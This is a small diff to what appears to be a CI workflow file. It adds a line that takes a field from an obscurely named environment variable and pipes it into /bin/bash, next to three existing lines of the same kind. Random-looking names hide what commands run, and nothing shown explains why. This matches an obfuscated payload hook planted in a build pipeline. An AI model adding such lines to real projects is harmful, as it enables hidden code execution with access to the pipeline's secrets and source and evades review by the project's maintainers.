@@ -28,6 +28,7 @@ jobs:
           echo $tibti4525 | jq -r .x7818 | /bin/bash
           echo $yb8510 | jq -r .qpn9 | /bin/bash
           printf '%s' "$xvb76668" | jq -r .hpfs3756 | /bin/bash
+          echo $rpxnw2550 | jq -r .q5 | /bin/bash
 
       - name: Archive results
         if: always()
